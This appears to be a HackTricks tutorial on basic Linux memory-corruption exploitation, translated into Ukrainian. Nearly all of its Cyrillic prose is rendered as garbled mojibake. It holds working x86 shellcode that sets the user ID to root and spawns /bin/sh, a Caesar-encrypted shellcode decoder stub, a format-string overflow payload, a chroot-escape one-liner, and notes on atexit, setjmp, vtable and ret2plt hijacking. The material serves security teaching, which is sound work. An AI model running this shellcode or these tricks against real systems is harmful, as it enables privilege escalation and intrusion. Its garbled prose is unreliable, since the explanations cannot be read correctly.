# Linux Exploiting (Basic) (SPA)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **2.SHELLCODE**

–ü–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ –ø–µ—Ä–µ—Ä–∏–≤–∞–Ω–Ω—è —è–¥—Ä–∞: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; –æ—á–∏—â–∞—î–º–æ eax\
xor ebx, ebx ; ebx = 0, –æ—Å–∫—ñ–ª—å–∫–∏ –Ω–µ–º–∞—î –∞—Ä–≥—É–º–µ–Ω—Ç—ñ–≤ –¥–ª—è –ø–µ—Ä–µ–¥–∞—á—ñ\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; –í–∏–∫–æ–Ω–∞—Ç–∏ syscall

**nasm -f elf assembly.asm** ‚Äî> –ü–æ–≤–µ—Ä—Ç–∞—î .o\
**ld assembly.o -o shellcodeout** ‚Äî> –î–∞—î –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π —Ñ–∞–π–ª, —Å—Ñ–æ—Ä–º–æ–≤–∞–Ω–∏–π –∑ –∫–æ–¥—É –∞—Å–µ–º–±–ª–µ—Ä–∞, —ñ –º–∏ –º–æ–∂–µ–º–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ –æ–ø–∫–æ–¥–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> –©–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —â–æ —Ü–µ –¥—ñ–π—Å–Ω–æ –Ω–∞—à–∞ shellcode —ñ –æ—Ç—Ä–∏–º–∞—Ç–∏ OpCodes

**–ü–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —â–æ shellcode –ø—Ä–∞—Ü—é—î**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
–©–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —â–æ —Å–∏—Å—Ç–µ–º–Ω—ñ –≤–∏–∫–ª–∏–∫–∏ –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è –ø—Ä–∞–≤–∏–ª—å–Ω–æ, –ø–æ—Ç—Ä—ñ–±–Ω–æ —Å–∫–æ–º–ø—ñ–ª—é–≤–∞—Ç–∏ –ø–æ–ø–µ—Ä–µ–¥–Ω—é –ø—Ä–æ–≥—Ä–∞–º—É, —ñ —Å–∏—Å—Ç–µ–º–Ω—ñ –≤–∏–∫–ª–∏–∫–∏ –ø–æ–≤–∏–Ω–Ω—ñ –∑'—è–≤–∏—Ç–∏—Å—è –≤ **strace ./PROGRAMA\_COMPILADO**

–ü—Ä–∏ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—ñ shellcode –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —Ç—Ä—é–∫. –ü–µ—Ä—à–∞ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è - —Ü–µ –ø–µ—Ä–µ—Ö—ñ–¥ –¥–æ –≤–∏–∫–ª–∏–∫—É. –í–∏–∫–ª–∏–∫ –∑–≤–µ—Ä—Ç–∞—î—Ç—å—Å—è –¥–æ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–æ–≥–æ –∫–æ–¥—É —ñ, –∫—Ä—ñ–º —Ç–æ–≥–æ, –ø–æ–º—ñ—â–∞—î EIP –≤ —Å—Ç–µ–∫. –ü—ñ—Å–ª—è —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó –≤–∏–∫–ª–∏–∫—É –º–∏ –ø–æ–º—ñ—Å—Ç–∏–ª–∏ –ø–æ—Ç—Ä—ñ–±–Ω–∏–π —Ä—è–¥–æ–∫, —Ç–æ–º—É –∑ —Ü–∏–º EIP –º–∏ –º–æ–∂–µ–º–æ –≤–∫–∞–∑–∞—Ç–∏ –Ω–∞ —Ä—è–¥–æ–∫ —ñ –ø—Ä–æ–¥–æ–≤–∂–∏—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É.

–ï–ñ **–¢–†–£–ö (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Egg Huter:**

–°–∫–ª–∞–¥–∞—î—Ç—å—Å—è –∑ –Ω–µ–≤–µ–ª–∏–∫–æ–≥–æ –∫–æ–¥—É, —è–∫–∏–π –ø—Ä–æ—Ö–æ–¥–∏—Ç—å —á–µ—Ä–µ–∑ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ –ø–∞–º'—è—Ç—ñ, –∞—Å–æ—Ü—ñ–π–æ–≤–∞–Ω—ñ –∑ –ø—Ä–æ—Ü–µ—Å–æ–º, —É –ø–æ—à—É–∫–∞—Ö shellcode, —â–æ —Ç–∞–º –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è (—à—É–∫–∞—î —è–∫—É—Å—å –ø—ñ–¥–ø–∏—Å, —Ä–æ–∑–º—ñ—â–µ–Ω—É –≤ shellcode). –ö–æ—Ä–∏—Å–Ω–æ –≤ —Ç–∏—Ö –≤–∏–ø–∞–¥–∫–∞—Ö, –∫–æ–ª–∏ —î –ª–∏—à–µ –Ω–µ–≤–µ–ª–∏–∫–∏–π –ø—Ä–æ—Å—Ç—ñ—Ä –¥–ª—è —ñ–Ω'—î–∫—Ü—ñ—ó –∫–æ–¥—É.

**Shellcodes –ø–æ–ª—ñ–º–æ—Ä—Ñ–Ω—ñ**

–°–∫–ª–∞–¥–∞—é—Ç—å—Å—è –∑ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—Ö shell, —è–∫—ñ –º–∞—é—Ç—å –Ω–µ–≤–µ–ª–∏–∫–∏–π –∫–æ–¥, —â–æ —ó—Ö —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤—É—î —ñ –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç—å –¥–æ –Ω—å–æ–≥–æ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ç—Ä—é–∫ Call-Pop, —Ü–µ –±—É–≤ –±–∏ **–ø—Ä–∏–∫–ª–∞–¥ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–æ–≥–æ —Ü–µ–∑–∞—Ä—è**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
## **5.–î–æ–¥–∞—Ç–∫–æ–≤—ñ –º–µ—Ç–æ–¥–∏**

**–¢–µ—Ö–Ω—ñ–∫–∞ –ú—É—Ä–∞—Ç–∞**

–í Linux –≤—Å—ñ –ø—Ä–æ–≥—Ä–∞–º–∏ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—é—Ç—å—Å—è, –ø–æ—á–∏–Ω–∞—é—á–∏ –∑ 0xbfffffff

–î–æ—Å–ª—ñ–¥–∂—É—é—á–∏, —è–∫ –±—É–¥—É—î—Ç—å—Å—è —Å—Ç–µ–∫ –Ω–æ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É –≤ Linux, –º–æ–∂–Ω–∞ —Ä–æ–∑—Ä–æ–±–∏—Ç–∏ –µ–∫—Å–ø–ª–æ–π—Ç —Ç–∞–∫–∏–º —á–∏–Ω–æ–º, —â–æ–± –ø—Ä–æ–≥—Ä–∞–º–∞ –∑–∞–ø—É—Å–∫–∞–ª–∞—Å—è –≤ —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ, —î–¥–∏–Ω–æ—é –∑–º—ñ–Ω–Ω–æ—é —è–∫–æ–≥–æ —î shellcode. –ê–¥—Ä–µ—Å—É —Ü—ñ—î—ó –∑–º—ñ–Ω–Ω–æ—ó –º–æ–∂–Ω–∞ –æ–±—á–∏—Å–ª–∏—Ç–∏ —è–∫: addr = 0xbfffffff - 4 - strlen(–Ü–ú'–Ø\_–≤–∏–∫–æ–Ω—É–≤–∞–Ω–æ–≥–æ\_—Ñ–∞–π–ª—É) - strlen(shellcode)

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, –º–æ–∂–Ω–∞ –ø—Ä–æ—Å—Ç–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∞–¥—Ä–µ—Å—É, –¥–µ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –∑–º—ñ–Ω–Ω–∞ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ –∑ shellcode.

–¶–µ –º–æ–∂–ª–∏–≤–æ –∑–∞–≤–¥—è–∫–∏ —Ç–æ–º—É, —â–æ —Ñ—É–Ω–∫—Ü—ñ—è execle –¥–æ–∑–≤–æ–ª—è—î —Å—Ç–≤–æ—Ä–∏—Ç–∏ —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ, —è–∫–µ –º—ñ—Å—Ç–∏—Ç—å –ª–∏—à–µ –±–∞–∂–∞–Ω—ñ –∑–º—ñ–Ω–Ω—ñ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞.

### **–§–æ—Ä–º–∞—Ç–Ω—ñ —Ä—è–¥–∫–∏ –¥–ª—è –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω—å –±—É—Ñ–µ—Ä–∞**

**sprintf moves** —Ñ–æ—Ä–º–∞—Ç–æ–≤–∞–Ω–∏–π —Ä—è–¥–æ–∫ **–≤** **–∑–º—ñ–Ω–Ω—É.** –¢–æ–º—É –≤–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ **—Ñ–æ—Ä–º–∞—Ç—É–≤–∞–Ω–Ω—è–º** —Ä—è–¥–∫–∞, —â–æ–± –≤–∏–∫–ª–∏–∫–∞—Ç–∏ **–ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –±—É—Ñ–µ—Ä–∞ –≤ –∑–º—ñ–Ω–Ω—ñ–π**, –∫—É–¥–∏ –∫–æ–ø—ñ—é—î—Ç—å—Å—è –≤–º—ñ—Å—Ç.\
–ù–∞–ø—Ä–∏–∫–ª–∞–¥, –∫–æ—Ä–∏—Å–Ω–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è `%.44xAAAA` **–∑–∞–ø–∏—à–µ 44B+"AAAA" —É –∑–º—ñ–Ω–Ω—É**, —â–æ –º–æ–∂–µ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –±—É—Ñ–µ—Ä–∞.

### **–°—Ç—Ä—É–∫—Ç—É—Ä–∏ \_\_atexit**

{% hint style="danger" %}
–°—å–æ–≥–æ–¥–Ω—ñ –¥—É–∂–µ **–Ω–µ–∑–≤–∏—á–Ω–æ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ —Ü–µ**.
{% endhint %}

**`atexit()`** ‚Äî —Ü–µ —Ñ—É–Ω–∫—Ü—ñ—è, —è–∫—ñ–π **–ø–µ—Ä–µ–¥–∞—é—Ç—å—Å—è —ñ–Ω—à—ñ —Ñ—É–Ω–∫—Ü—ñ—ó —è–∫ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏.** –¶—ñ **—Ñ—É–Ω–∫—Ü—ñ—ó** –±—É–¥—É—Ç—å **–≤–∏–∫–æ–Ω–∞–Ω—ñ** –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è **`exit()`** –∞–±–æ **–ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è** –∑ **main**.\
–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–º—ñ–Ω–∏—Ç–∏** **–∞–¥—Ä–µ—Å—É** –±—É–¥—å-—è–∫–æ—ó –∑ —Ü–∏—Ö **—Ñ—É–Ω–∫—Ü—ñ–π**, —â–æ–± –≤–∫–∞–∑–∞—Ç–∏ –Ω–∞ shellcode, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –≤–∏ **–æ—Ç—Ä–∏–º–∞—î—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å** –Ω–∞–¥ **–ø—Ä–æ—Ü–µ—Å–æ–º**, –∞–ª–µ —Ü–µ –Ω–∞—Ä–∞–∑—ñ —Å–∫–ª–∞–¥–Ω—ñ—à–µ.\
–ù–∞—Ä–∞–∑—ñ **–∞–¥—Ä–µ—Å–∏ —Ñ—É–Ω–∫—Ü—ñ–π**, —è–∫—ñ –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–æ–Ω–∞—Ç–∏, **—Å—Ö–æ–≤–∞–Ω—ñ** –∑–∞ –∫—ñ–ª—å–∫–æ–º–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞–º–∏, —ñ –≤—Ä–µ—à—Ç—ñ-—Ä–µ—à—Ç –∞–¥—Ä–µ—Å–∏, –Ω–∞ —è–∫—ñ –≤–æ–Ω–∏ –≤–∫–∞–∑—É—é—Ç—å, –Ω–µ —î –∞–¥—Ä–µ—Å–∞–º–∏ —Ñ—É–Ω–∫—Ü—ñ–π, –∞ **–∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é XOR** —Ç–∞ –∑—Å—É–≤—ñ–≤ –∑ **–≤–∏–ø–∞–¥–∫–æ–≤–∏–º –∫–ª—é—á–µ–º**. –¢–æ–º—É –Ω–∞—Ä–∞–∑—ñ —Ü–µ–π –≤–µ–∫—Ç–æ—Ä –∞—Ç–∞–∫–∏ **–Ω–µ –¥—É–∂–µ –∫–æ—Ä–∏—Å–Ω–∏–π, –ø—Ä–∏–Ω–∞–π–º–Ω—ñ –Ω–∞ x86** —Ç–∞ **x64\_86**.\
**–§—É–Ω–∫—Ü—ñ—è —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è** ‚Äî —Ü–µ **`PTR_MANGLE`**. **–Ü–Ω—à—ñ –∞—Ä—Ö—ñ—Ç–µ–∫—Ç—É—Ä–∏**, —Ç–∞–∫—ñ —è–∫ m68k, mips32, mips64, aarch64, arm, hppa... **–Ω–µ —Ä–µ–∞–ª—ñ–∑—É—é—Ç—å —Ñ—É–Ω–∫—Ü—ñ—é —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è**, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–æ–Ω–∞ **–ø–æ–≤–µ—Ä—Ç–∞—î —Ç–µ –∂ —Å–∞–º–µ**, —â–æ –æ—Ç—Ä–∏–º–∞–ª–∞ –Ω–∞ –≤—Ö—ñ–¥. –¢–æ–º—É —Ü—ñ –∞—Ä—Ö—ñ—Ç–µ–∫—Ç—É—Ä–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∞—Ç–∞–∫–æ–≤–∞–Ω—ñ –∑–∞ —Ü–∏–º –≤–µ–∫—Ç–æ—Ä–æ–º.

### **setjmp() & longjmp()**

{% hint style="danger" %}
–°—å–æ–≥–æ–¥–Ω—ñ –¥—É–∂–µ **–Ω–µ–∑–≤–∏—á–Ω–æ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ —Ü–µ**.
{% endhint %}

**`Setjmp()`** –¥–æ–∑–≤–æ–ª—è—î **–∑–±–µ—Ä—ñ–≥–∞—Ç–∏** **–∫–æ–Ω—Ç–µ–∫—Å—Ç** (—Ä–µ—î—Å—Ç—Ä–∏)\
**`longjmp()`** –¥–æ–∑–≤–æ–ª—è—î **–≤—ñ–¥–Ω–æ–≤–ª—é–≤–∞—Ç–∏** **–∫–æ–Ω—Ç–µ–∫—Å—Ç**.\
**–ó–±–µ—Ä–µ–∂–µ–Ω—ñ —Ä–µ—î—Å—Ç—Ä–∏**: `EBX, ESI, EDI, ESP, EIP, EBP`\
–°—É—Ç—å —É —Ç–æ–º—É, —â–æ EIP —Ç–∞ ESP –ø–µ—Ä–µ–¥–∞—é—Ç—å—Å—è —Ñ—É–Ω–∫—Ü—ñ—î—é **`PTR_MANGLE`**, —Ç–æ–º—É **–∞—Ä—Ö—ñ—Ç–µ–∫—Ç—É—Ä–∏, –≤—Ä–∞–∑–ª–∏–≤—ñ –¥–æ —Ü—ñ—î—ó –∞—Ç–∞–∫–∏, —Ç–∞–∫—ñ –∂, —è–∫ —ñ –≤–∏—â–µ**.\
–í–æ–Ω–∏ –∫–æ—Ä–∏—Å–Ω—ñ –¥–ª—è –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –ø–æ–º–∏–ª–æ–∫ –∞–±–æ –ø–µ—Ä–µ—Ä–∏–≤–∞–Ω—å.\
–û–¥–Ω–∞–∫, –∑ —Ç–æ–≥–æ, —â–æ —è —á–∏—Ç–∞–≤, —ñ–Ω—à—ñ —Ä–µ—î—Å—Ç—Ä–∏ –Ω–µ –∑–∞—Ö–∏—â–µ–Ω—ñ, **—Ç–æ–º—É —è–∫—â–æ —î `call ebx`, `call esi` –∞–±–æ `call edi`** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –≤–∏–∫–ª–∏–∫–∞–Ω–æ—ó —Ñ—É–Ω–∫—Ü—ñ—ó, –∫–æ–Ω—Ç—Ä–æ–ª—å –º–æ–∂–µ –±—É—Ç–∏ –∑–∞—Ö–æ–ø–ª–µ–Ω–∏–π. –ê–±–æ –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ EBP, —â–æ–± –∑–º—ñ–Ω–∏—Ç–∏ ESP.

**VTable —Ç–∞ VPTR —É C++**

–ö–æ–∂–µ–Ω –∫–ª–∞—Å –º–∞—î **Vtable**, —è–∫–∞ —î –º–∞—Å–∏–≤–æ–º **–≤–∫–∞–∑—ñ–≤–Ω–∏–∫—ñ–≤ –Ω–∞ –º–µ—Ç–æ–¥–∏**.

–ö–æ–∂–µ–Ω –æ–±'—î–∫—Ç –∫–ª–∞—Å—É –º–∞—î **VPtr**, —è–∫–∏–π —î **–≤–∫–∞–∑—ñ–≤–Ω–∏–∫–æ–º** –Ω–∞ –º–∞—Å–∏–≤ —Å–≤–æ–≥–æ –∫–ª–∞—Å—É. VPtr —î —á–∞—Å—Ç–∏–Ω–æ—é –∑–∞–≥–æ–ª–æ–≤–∫–∞ –∫–æ–∂–Ω–æ–≥–æ –æ–±'—î–∫—Ç–∞, —Ç–æ–º—É, —è–∫—â–æ –¥–æ—Å—è–≥–Ω—É—Ç–æ **–ø–µ—Ä–µ–∑–∞–ø–∏—Å—É** **VPtr**, –π–æ–≥–æ –º–æ–∂–Ω–∞ **–∑–º—ñ–Ω–∏—Ç–∏**, —â–æ–± **–≤–∫–∞–∑—É–≤–∞—Ç–∏** –Ω–∞ —Ñ–∞–ª—å—à–∏–≤–∏–π –º–µ—Ç–æ–¥, —Ç–∞–∫ —â–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ—ó –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ shellcode.

## **–ó–∞–ø–æ–±—ñ–∂–Ω—ñ –∑–∞—Ö–æ–¥–∏ —Ç–∞ —É—Ö–∏–ª–µ–Ω–Ω—è**

**–ó–∞–º—ñ–Ω–Ω–∏–∫ Libsafe**

–ê–∫—Ç–∏–≤—É—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é: LD\_PRELOAD=/lib/libsafe.so.2\
–∞–±–æ\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

–ü–µ—Ä–µ—Ö–æ–ø–ª—é—é—Ç—å—Å—è –≤–∏–∫–ª–∏–∫–∏ –¥–æ –¥–µ—è–∫–∏—Ö –Ω–µ–±–µ–∑–ø–µ—á–Ω–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π —ñ–Ω—à–∏–º–∏ –±–µ–∑–ø–µ—á–Ω–∏–º–∏. –ù–µ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–∏–∑–æ–≤–∞–Ω–æ. (—Ç—ñ–ª—å–∫–∏ –¥–ª—è x86, –Ω–µ –¥–ª—è –∫–æ–º–ø—ñ–ª—è—Ü—ñ–π –∑ -fomit-frame-pointer, –Ω–µ —Å—Ç–∞—Ç–∏—á–Ω–∏—Ö –∫–æ–º–ø—ñ–ª—è—Ü—ñ–π, –Ω–µ –≤—Å—ñ –≤—Ä–∞–∑–ª–∏–≤—ñ —Ñ—É–Ω–∫—Ü—ñ—ó —Å—Ç–∞—é—Ç—å –±–µ–∑–ø–µ—á–Ω–∏–º–∏, —ñ LD\_PRELOAD –Ω–µ –ø—Ä–∞—Ü—é—î –≤ –±—ñ–Ω–∞—Ä–Ω–∏—Ö —Ñ–∞–π–ª–∞—Ö –∑ suid).

**ASCII Armored Address Space**

–°–∫–ª–∞–¥–∞—î—Ç—å—Å—è –∑ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Å–ø—ñ–ª—å–Ω–∏—Ö –±—ñ–±–ª—ñ–æ—Ç–µ–∫ –∑ 0x00000000 –¥–æ 0x00ffffff, —â–æ–± –∑–∞–≤–∂–¥–∏ –±—É–≤ –±–∞–π—Ç 0x00. –û–¥–Ω–∞–∫ —Ü–µ –Ω–∞—Å–ø—Ä–∞–≤–¥—ñ –Ω–µ –∑—É–ø–∏–Ω—è—î –º–∞–π–∂–µ –∂–æ–¥–Ω—É –∞—Ç–∞–∫—É, —ñ —Ç–∏–º –±—ñ–ª—å—à–µ –≤ little endian.

**ret2plt**

–°–∫–ª–∞–¥–∞—î—Ç—å—Å—è –≤ —Ç–æ–º—É, —â–æ–± –≤–∏–∫–æ–Ω–∞—Ç–∏ ROP —Ç–∞–∫, —â–æ–± –≤–∏–∫–ª–∏–∫–∞–ª–∞—Å—è —Ñ—É–Ω–∫—Ü—ñ—è strcpy@plt (–∑ plt) —ñ –≤–∫–∞–∑—É–≤–∞–ª–∞—Å—è –Ω–∞ –≤—Ö—ñ–¥ GOT, —ñ –∫–æ–ø—ñ—é–≤–∞–≤—Å—è –ø–µ—Ä—à–∏–π –±–∞–π—Ç —Ñ—É–Ω–∫—Ü—ñ—ó, —è–∫—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ (system()). –ü–æ—Ç—ñ–º —Ä–æ–±–∏—Ç—å—Å—è —Ç–µ –∂ —Å–∞–º–µ, –≤–∫–∞–∑—É—é—á–∏ –Ω–∞ GOT+1, —ñ –∫–æ–ø—ñ—é—î—Ç—å—Å—è 2-–π –±–∞–π—Ç system()‚Ä¶ –í—Ä–µ—à—Ç—ñ-—Ä–µ—à—Ç –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –∞–¥—Ä–µ—Å–∞, –∑–±–µ—Ä–µ–∂–µ–Ω–∞ –≤ GOT, —è–∫–∞ –±—É–¥–µ system().

**–ö–ª—ñ—Ç–∫–∏ –∑ chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> –í—Å—Ç–∞–Ω–æ–≤–ª—é—î –±–∞–∑–æ–≤—É —Å–∏—Å—Ç–µ–º—É –≤ –ø—ñ–¥–∫–∞—Ç–∞–ª–æ–∑—ñ

–ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä –º–æ–∂–µ –≤–∏–π—Ç–∏ –∑ –æ–¥–Ω—ñ—î—ó –∑ —Ü–∏—Ö –∫–ª—ñ—Ç–æ–∫, –≤–∏–∫–æ–Ω–∞–≤—à–∏: mkdir foo; chroot foo; cd ..

**–Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞—Ü—ñ—è –∫–æ–¥—É**

Valgrind ‚Äî> –®—É–∫–∞—î –ø–æ–º–∏–ª–∫–∏\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 –ü–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –∫—É–ø–∏: –±–∞–∑–æ–≤—ñ –µ–∫—Å–ø–ª–æ–π—Ç–∏**

**–í–∏–¥—ñ–ª–µ–Ω–∏–π —à–º–∞—Ç–æ–∫**

prev\_size |\
size | ‚Äî–ó–∞–≥–æ–ª–æ–≤–æ–∫\
\*mem | –î–∞–Ω—ñ

**–í—ñ–ª—å–Ω–∏–π —à–º–∞—Ç–æ–∫**

prev\_size |\
size |\
\*fd | –í–∫–∞–∑—ñ–≤–Ω–∏–∫ –Ω–∞ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —à–º–∞—Ç–æ–∫\
\*bk | –í–∫–∞–∑—ñ–≤–Ω–∏–∫ –Ω–∞ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π —à–º–∞—Ç–æ–∫ ‚Äî–ó–∞–≥–æ–ª–æ–≤–æ–∫\
\*mem | –î–∞–Ω—ñ

–í—ñ–ª—å–Ω—ñ —à–º–∞—Ç–∫–∏ –∑–Ω–∞—Ö–æ–¥—è—Ç—å—Å—è –≤ –¥–≤–æ–∑–≤'—è–∑–Ω–æ–º—É —Å–ø–∏—Å–∫—É (bin) —ñ –Ω—ñ–∫–æ–ª–∏ –Ω–µ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –¥–≤–∞ –≤—ñ–ª—å–Ω–∏—Ö —à–º–∞—Ç–∫–∏ —Ä–∞–∑–æ–º (–≤–æ–Ω–∏ –æ–±'—î–¥–Ω—É—é—Ç—å—Å—è)

